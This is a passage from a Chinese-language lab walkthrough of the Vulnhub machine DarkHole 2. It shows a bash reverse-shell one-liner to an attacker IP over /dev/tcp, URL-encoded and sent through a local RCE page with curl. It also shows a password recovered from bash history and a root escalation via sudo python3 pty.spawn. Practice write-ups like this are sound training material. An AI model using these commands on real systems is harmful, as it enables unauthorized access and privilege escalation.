class=\"hljs-built_in\">bin</span>/at\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-<span class=\"hljs-number\">1.0</span>/dbus-daemon-launch-helper\n/usr/lib/policykit-<span class=\"hljs-number\">1</span>/polkit-agent-helper-<span class=\"hljs-number\">1</span>\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/snapd/snap-confine\n</code></pre>\n<p>想尝试<code>snapd</code> 提权的，但是版本对不上</p>\n</li>\n</ul>\n</li>\n<li>\n<p>查看<code>bash</code>历史记录</p>\n<pre><code class=\"hljs language-python\">jehad@darkhole:~$ cat .bash_history \n</code></pre>\n<p><img src=\"/post-images/VulnhubDarkHole%202/image78.png\" alt=\"image.png\"></p>\n<p>发现执行了很多 <code>curl \"http://127.0.0.1:9999/?cmd=&#x3C;命令>\"</code>  之类的，估计<code>9999</code>端口下是一个能进行<code>RCE</code>的页面</p>\n</li>\n<li>\n<p>我们也尝试执行下</p>\n<ul>\n<li>\n<p>先试试<code>id</code> ，发现是<code>losy</code>的权限</p>\n<pre><code class=\"hljs language-python\">jehad@darkhole:~$ curl http://<span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">9999</span>/?cmd=<span class=\"hljs-built_in\">id</span>\nParameter GET[<span class=\"hljs-string\">'cmd'</span>]uid=<span class=\"hljs-number\">1002</span>(losy) gid=<span class=\"hljs-number\">1002</span>(losy) groups=<span class=\"hljs-number\">1002</span>(losy)\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>获得<code>losy</code>用户的权限</p>\n<ul>\n<li>\n<p>跟着反弹shell命令</p>\n<p>因为靶机的<code>nc</code>没有<code>-e</code>参数，只能通过其他方式来反弹<code>shell</code></p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># 通过shell</span>\nbash -c <span class=\"hljs-string\">'bash -i >&#x26; /dev/tcp/192.168.75.151/1234 0>&#x26;1'</span>\n</code></pre>\n</li>\n<li>\n<p>将其进行URl编码</p>\n<pre><code class=\"hljs language-python\">bash+-c+%27bash+-i+%3e%<span class=\"hljs-number\">26</span>+%2fdev%2ftcp%2f192<span class=\"hljs-number\">.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>%2f1234+<span class=\"hljs-number\">0</span>%3e%<span class=\"hljs-number\">261</span>%<span class=\"hljs-number\">27</span>\n</code></pre>\n</li>\n<li>\n<p>构建命令</p>\n<pre><code class=\"hljs language-python\">curl <span class=\"hljs-string\">\"http://127.0.0.1:9999/?cmd=bash+-c+%27bash+-i+%3e%26+%2fdev%2ftcp%2f192.168.75.151%2f1234+0%3e%261%27\"</span>\n</code></pre>\n</li>\n<li>\n<p><code>kali</code> 开启监听，执行命令</p>\n<pre><code class=\"hljs language-python\">nc -lvp <span class=\"hljs-number\">1234</span>\nlistening on [<span class=\"hljs-built_in\">any</span>] <span class=\"hljs-number\">1234</span> ...\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.185</span>: inverse host lookup failed: Unknown host\nconnect to [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>] <span class=\"hljs-keyword\">from</span> (UNKNOWN) [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.185</span>] <span class=\"hljs-number\">33342</span>\nbash: cannot <span class=\"hljs-built_in\">set</span> terminal process group (<span class=\"hljs-number\">1215</span>): Inappropriate ioctl <span class=\"hljs-keyword\">for</span> device\nbash: no job control <span class=\"hljs-keyword\">in</span> this shell\nlosy@darkhole:/opt/web$ \n</code></pre>\n<p>获得<code>losy</code>的<code>shell</code>！！！</p>\n</li>\n</ul>\n</li>\n</ol>\n<h2>提权 - losy用户</h2>\n<ol>\n<li>\n<p>和之前一样，我们先查看<code>bash</code>历史记录</p>\n<p><img src=\"/post-images/VulnhubDarkHole%202/image79.png\" alt=\"image.png\"></p>\n<p>可以找到<code>losy</code>的密码为<code>gang</code></p>\n</li>\n<li>\n<p>进行<code>ssh</code>登录，能过得交互性更好的<code>shell</code></p>\n</li>\n<li>\n<p>查看权限</p>\n<ul>\n<li>\n<p><code>SUDO</code> ，可以以root权限执行<code>python3</code> ，可以提权了</p>\n<pre><code class=\"hljs language-python\">```python\nlosy@darkhole:~$ sudo -l\n[sudo] password <span class=\"hljs-keyword\">for</span> losy: \nMatching Defaults entries <span class=\"hljs-keyword\">for</span> losy on darkhole:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/<span class=\"hljs-built_in\">bin</span>\\:/usr/sbin\\:/usr/<span class=\"hljs-built_in\">bin</span>\\:/sbin\\:/<span class=\"hljs-built_in\">bin</span>\\:/snap/<span class=\"hljs-built_in\">bin</span>\n\nUser losy may run the following commands on darkhole:\n    (root) /usr/<span class=\"hljs-built_in\">bin</span>/python3\n</code></pre>\n<pre><code class=\"hljs\"></code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>使用<code>python3</code>提权，使用<code>python</code>生成虚拟终端即可</p>\n<pre><code class=\"hljs language-python\">losy@darkhole:~$ sudo /usr/<span class=\"hljs-built_in\">bin</span>/python3 -c <span class=\"hljs-string\">\"import pty;pty.spawn('/bin/sh')\"</span>\n<span class=\"hljs-comment\"># whoami</span>\nroot\n</code></pre>\n<p>获得<code>root</code>！！！！</p>\n</li>\n<li>\n<p>读取<code>flag</code>文件</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># cat root.txt</span>\nDarkHole{<span class=\"hljs-string\">'Legend'</span>}\n</code></pre>\n</li>\n</ol>\n<h2>总结</h2>\n<p><code>.git</code>的使用，以及<code>git diff</code>；以及<code>bash_history</code>也可能存在敏感内容；</p>","title":"Vulnhub - DarkHole 2","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"DarkHole: 2 https://www.vulnhub.com/entry/darkhole 2,740/ 端口扫描主机发现 1. 探测存活主机，185是靶机 2. 探测主机所有开放端口 3. 探测服务版本以及系统版本 4. 扫描漏洞 找到.git ，可能存在源码泄露 web渗透 1. 访问..."},"recentPosts":[{"id":"念念碎","title":"念念碎","date":"2025-10-26","isEncrypted":false,"year":"2025","month":"10","day":"26"},{"id":"HackMyVMSysadmin","title":"HackMyVM - Sysadmin","date":"2025-10-25","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"TheHackersLabsAllSafe","title":"TheHackersLabs - AllSafe","date":"2025-10-21","isEncrypted":false,"year":"2025","month":"10","day":"21"},{"id":"TheHackersLabsLavaShop","title":"TheHackersLabs - LavaShop","date":"2025-10-20","isEncrypted":false,"year":"2025","month":"10","day":"20"},{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"}]},"__N_SSG":true}